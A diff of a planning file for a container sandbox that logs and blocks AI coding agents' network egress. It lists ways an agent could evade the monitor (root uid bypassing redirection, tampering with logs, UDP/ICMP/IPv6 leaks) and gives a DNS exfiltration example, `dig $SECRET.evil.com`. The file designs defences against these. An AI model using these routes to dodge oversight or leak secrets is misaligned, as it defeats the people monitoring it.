@@ -4,7 +4,7 @@
 - **Project Type**: Brownfield
 - **Feature**: M7 — `--audit` network audit log (+ G6 egress allow-list)
 - **Start Date**: 2026-08-11T13:36:55Z
-- **Last Updated**: 2026-09-30
+- **Last Updated**: 2026-10-05
 - **Branch**: `feature/audit-inception`
 - **Current Stage**: CONSTRUCTION — Code Generation + Build & Test **complete
   (host-verified)**; live-container verification parked (no Docker in dev)
@@ -47,29 +47,82 @@ tests incl. PBT all green). **The `--audit` feature is code-complete.**
   carry a bare IP as `dst_host`; mitmproxy hot-reloads the addon if the file is
   edited mid-session (flushes + loses in-flight SNI).
 
-**▶ OPEN ISSUES — start here next session:**
-2. **Log lands in the agent-accessible project dir (NFR-4 gap).** Sidecar writes to
-   a private `mktemp` dir (tamper-safe during the run), but `trigon-up.sh` copies
-   it to `<project>/audit-log/` at session end → a *later* agent session on the
-   same project can read/alter old logs. Decide a non-agent-mounted destination
-   (e.g. `~/.trigon-audit/<name>/`, NOT `~/.trigon-settings-<name>` which is also
-   mounted). Open design decision, not yet changed.
+**▶ COMPLETION PLAN (agreed 2026-10-05) — start here next session at Batch 1.**
+Goal: make "ALL agent egress is logged or blocked" literally true, fix the log
+location (issue 2) and support concurrent sessions. Batches in order:
 
-**Found while fixing #1 (new, open):**
-- **Coverage gap:** only TCP :80/:443 are redirected. Other TCP ports, UDP (DNS,
-  QUIC) and IPv6 leave unlogged and unblocked — contradicts the "ALL egress"
-  claim in `--help`/README.
-- **Concurrent sessions collide:** every `--audit` session uses the same
-  `compose-audit-gw-1`; a second session recreates it and finalize now removes
-  it. Needs a per-session gateway/project name. One audited session at a time
-  until then.
+**Batch 1 — one quick session, low risk (no Docker needed except a final smoke run):**
+- **1a. `--audit` + `--root` guard (NEW HOLE, found 2026-10-05).** `entrypoint.sh`
+  RETURNs uid 0 so mitmproxy's own upstream isn't looped back; with `--root` the
+  agent *is* uid 0 (`LOCAL_UID=0`), so none of its egress is redirected/logged.
+  Same if the host user is root (e.g. CI). Running mitmdump under a dedicated uid
+  is not enough: `--root` grants `SETUID`, so the agent could switch to it. Fix:
+  refuse `--audit` + `--root` (like `--playwright`), and refuse when `id -u` is 0.
+  Add bats cases.
+- **1b. Per-session compose project.** `trigon-up.sh` never passes `-p`, so every
+  invocation (audit or not, incl. the litellm sidecar / air-gap net) shares the
+  compose project "compose" → `compose-audit-gw-1` collides. Fix: per-invocation
+  `-p trigon-${NAME}-<short random>` (lowercased/sanitized) on every compose call,
+  plus `compose down` at exit so per-session networks don't accumulate. Finalize's
+  `rm --stop audit-gw` then targets only this session's gateway.
+- **1c. Issue 2 — log location + tamper evidence (decision D7, approved 2026-10-05).**
+  - Destination: `${XDG_STATE_HOME:-$HOME/.local/state}/trigon/audit/<project-slug>/`,
+    overridable via `TRIGON_AUDIT_DIR`. No longer written into `<project>/audit-log/`
+    (update requirements wording, README, `--help`, `.gitignore` note, design §5).
+  - Add that dir to `mount_denied_reason()` (G1 deny-list) so it can never be
+    mounted into a container. Dir 0700, finished files chmod 0444.
+  - Hash chain: each JSONL record carries `prev` = sha256 of the previous line
+    (genesis = fixed value); schema bump to v2. `audit_summary.py` verifies the
+    chain, records the head hash in the summary, and `trigon-up.sh` prints the
+    head hash at session end. Result: the agent never reaches the log
+    (tamper-proof from the agent), later edits by anyone are detectable.
+  - Update `tests/test_audit_summary.py` (chain verify + PBT: any single-line
+    edit/delete/reorder is detected) and `audit.bats`.
 
-**Also before merge:**
-3. Verify the remaining M7 gates (#1 is fixed): `--audit-decrypt` doesn't break
-   Claude Code's own provider calls (Node CA trust); `--air-gap --audit`
-   zero-egress; `--playwright-headless` egress transits the gateway.
-4. Pin the base image by digest (`MITMPROXY_BASE` in `compose/audit/Dockerfile`, NFR-6).
-5. Run `tests/cli/audit.bats` under `bats` + shellcheck; then open PR.
+**Batch 2 — coverage (needs live checks on the user's Docker):**
+- Redirect **all** agent TCP (not just 80/443) to mitmproxy; keep loopback and the
+  gateway uid excluded. Destination-only mode passes everything through
+  immediately (`ignore_hosts=.*`), so server-speaks-first protocols (SSH, SMTP,
+  DBs) should work. Decrypt mode: limit interception to :80/:443 via an
+  `ignore_hosts` regex on `host:port` — verify live.
+- **Block everything else by default** (filter OUTPUT for the agent uid): allow lo,
+  TCP (redirected), DNS (→ Batch 3); **REJECT** (not DROP, so clients fall back
+  fast) all other UDP incl. QUIC, ICMP (Docker's default `ping_group_range` lets
+  an unprivileged uid ping without NET_RAW → ICMP tunnels), everything else. At
+  shutdown dump the REJECT counters into the log as a "blocked" record.
+  UDP/QUIC blocking accepted 2026-10-05 (see rationale below).
+- **IPv6 off:** compose `sysctls: net.ipv6.conf.all.disable_ipv6=1` + `ip6tables`
+  default-deny as belt-and-braces.
+- Move `route_localnet` to compose `sysctls:` — the entrypoint's `sysctl -w ... || true`
+  likely fails silently (`/proc/sys` is read-only in an unprivileged container).
+- Update `--help`/README "ALL egress" wording to the precise guarantee.
+
+**Batch 3 — DNS logging (the hard one; biggest remaining hole):**
+- The agent resolves via Docker's embedded resolver 127.0.0.11; Docker's own nat
+  OUTPUT DNAT runs before our appended rules and dockerd does the upstream lookup,
+  so DNS never touches mitmproxy → `dig $SECRET.evil.com` exfiltrates unlogged.
+- Fix: second mitmproxy listener in DNS mode (mitmproxy 11 supports `dns` mode);
+  `-I` (insert, ahead of Docker's rules) a redirect of the agent uid's udp+tcp :53
+  to it; addon logs query names via `dns_request`. Expect a few live iterations.
+- Also verify whether `--air-gap` leaks DNS the same way (embedded resolver
+  forwarding on `internal: true` networks).
+
+**Batch 4 — before merge:**
+- Live gates: `--audit-decrypt` doesn't break Claude Code's provider calls (Node
+  CA trust); `--air-gap --audit` zero-egress; `--playwright-headless` egress
+  transits the gateway.
+- Pin `MITMPROXY_BASE` by digest in `compose/audit/Dockerfile` (NFR-6).
+- Run `tests/cli/audit.bats` under bats + shellcheck; open PR to `master`.
+
+**Rationale — blocking UDP/QUIC (asked 2026-10-05):** Claude Code is Node.js;
+Node's `https`/`fetch` (undici) speak HTTP/1.1 (+HTTP/2 over TCP), not HTTP/3, so
+it never uses QUIC. OpenCode (Bun) likewise. npm/pip/apt/git/curl are TCP.
+DNS is the only UDP an agent needs, and it is handled separately (Batch 3).
+Chromium (`--playwright-headless`) does try QUIC, but falls back to TCP
+automatically when UDP is refused (as on many corporate networks) — REJECT makes
+the fallback instant. What does break, by design: UDP tools (VPNs/WireGuard, NTP
+clients, mosh, `nmap -sU` in security mode). Note that in the security-mode docs.
+Container clock comes from the host, so NTP is irrelevant.
 
 **Files delivered:** `trigon-up.sh` (flags/guards/fragment/finalize/help),
 `compose/audit/{entrypoint.sh,audit_addon.py}`, `lib/audit_summary.py`,
